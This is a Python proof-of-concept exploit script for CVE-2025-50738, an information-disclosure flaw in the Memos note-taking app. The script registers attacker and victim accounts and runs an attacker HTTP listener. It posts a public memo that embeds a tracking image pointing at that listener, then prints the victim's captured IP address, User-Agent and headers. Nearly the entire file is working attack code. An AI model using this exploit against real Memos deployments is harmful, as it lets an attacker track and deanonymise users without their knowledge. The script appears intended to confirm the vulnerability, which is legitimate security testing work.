#!/usr/bin/env python3
import requests
import time
import threading
import sys
import re
from http.server import HTTPServer, BaseHTTPRequestHandler

MEMOS_URL = "http://127.0.0.1:5230"
ATTACKER_HOST = "127.0.0.1"
ATTACKER_PORT = 8888

captured_requests = []

class AttackerHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        captured_requests.append({
            "path": self.path,
            "headers": dict(self.headers),
            "client_address": self.client_address[0]
        })
        self.send_response(200)
        self.send_header("Content-Type", "image/png")
        self.end_headers()
        self.wfile.write(b'\x89PNG\r\n\x1a\n')
    
    def log_message(self, format, *args):
        pass

def start_attacker_server():
    server = HTTPServer((ATTACKER_HOST, ATTACKER_PORT), AttackerHandler)
    server.handle_request()
    return server

def extract_cookie(response):
    cookie_header = response.headers.get("Grpc-Metadata-Set-Cookie", "")
    if cookie_header:
        match = re.search(r'memos\.access-token=([^;]+)', cookie_header)
        if match:
            return match.group(1)
    return None

def signup(session, username, password):
    resp = session.post(f"{MEMOS_URL}/api/v1/auth/signup", params={
        "username": username,
        "password": password
    })
    if resp.status_code == 200:
        token = extract_cookie(resp)
        if token:
            session.cookies.set("memos.access-token", token)
        return True, resp
    return False, resp

def signin(session, username, password):
    resp = session.post(f"{MEMOS_URL}/api/v1/auth/signin", params={
        "username": username,
        "password": password
    })
    if resp.status_code == 200:
        token = extract_cookie(resp)
        if token:
            session.cookies.set("memos.access-token", token)
        return True, resp
    return False, resp

def create_memo(session, content, visibility="PUBLIC"):
    resp = session.post(f"{MEMOS_URL}/api/v1/memos", json={
        "content": content,
        "visibility": visibility
    })
    return resp.status_code == 200, resp

def list_memos(session):
    resp = session.get(f"{MEMOS_URL}/api/v1/memos")
    if resp.status_code == 200:
        return resp.json()
    return None

def main():
    print("="*60)
    print("CVE-2025-50738 PoC - Memos Information Disclosure")
    print("="*60)
    
    attacker_session = requests.Session()
    victim_session = requests.Session()
    
    attacker_user = "attacker"
    attacker_pass = "Attacker123"
    victim_user = "victim"
    victim_pass = "Victim123"
    
    print("\n[*] Checking Memos service...")
    try:
        resp = requests.get(f"{MEMOS_URL}/api/v1/workspace/profile", timeout=5)
        data = resp.json()
        print(f"[+] Memos version: {data.get('version', 'unknown')}")
    except Exception as e:
        print(f"[-] Failed to connect to Memos: {e}")
        return 1
    
    print(f"\n[*] Setting up attacker user: {attacker_user}")
    success, resp = signup(attacker_session, attacker_user, attacker_pass)
    if not success:
        success, resp = signin(attacker_session, attacker_user, attacker_pass)
        if success:
            print(f"[+] Attacker logged in (existing user)")
        else:
            print(f"[-] Attacker auth failed: {resp.text}")
            return 1
    else:
        print(f"[+] Attacker user created and logged in")
    
    print(f"\n[*] Setting up victim user: {victim_user}")
    success, resp = signup(victim_session, victim_user, victim_pass)
    if not success:
        success, resp = signin(victim_session, victim_user, victim_pass)
        if success:
            print(f"[+] Victim logged in (existing user)")
        else:
            print(f"[-] Victim auth failed: {resp.text}")
            return 1
    else:
        print(f"[+] Victim user created and logged in")
    
    attacker_url = f"http://{ATTACKER_HOST}:{ATTACKER_PORT}"
    
    print(f"\n[*] Starting attacker HTTP server on {attacker_url}")
    server_thread = threading.Thread(target=start_attacker_server, daemon=True)
    server_thread.start()
    time.sleep(0.5)
    
    malicious_content = f"Check this image: ![tracking]({attacker_url}/track.png?uid=victim)"
    print(f"\n[*] Attacker creating malicious memo with embedded tracking image...")
    success, resp = create_memo(attacker_session, malicious_content, "PUBLIC")
    if success:
        print(f"[+] Malicious memo created successfully")
    else:
        print(f"[-] Failed to create memo: {resp.status_code} - {resp.text}")
        return 1
    
    print(f"\n[*] Victim browsing public memos...")
    memos = list_memos(victim_session)
    
    if memos and "memos" in memos:
        for memo in memos["memos"]:
            content = memo.get("content", "")
            if "track.png" in content:
                match = re.search(r'!\[.*?\]\((.*?)\)', content)
                if match:
                    img_url = match.group(1)
                    print(f"[*] Victim's browser fetches tracking image: {img_url}")
                    try:
                        victim_session.get(img_url, timeout=2)
                    except:
                        pass
    
    time.sleep(1)
    
    print("\n" + "="*60)
    print("RESULTS")
    print("="*60)
    
    if captured_requests:
        print("\n[+] VULNERABILITY CONFIRMED!")
        print("[+] Attacker captured victim's request:")
        for req in captured_requests:
            print(f"    - Client IP: {req['client_address']}")
            print(f"    - User-Agent: {req['headers'].get('User-Agent', 'N/A')}")
            print(f"    - Request Path: {req['path']}")
            print(f"    - Host Header: {req['headers'].get('Host', 'N/A')}")
        print("\n[+] Attack successful - attacker can track users via embedded images")
        print("[+] Disclosed: IP address, User-Agent, and other HTTP headers")
        return 0
    else:
        print("\n[-] No requests captured - vulnerability may not be exploitable")
        return 1

if __name__ == "__main__":
    sys.exit(main())
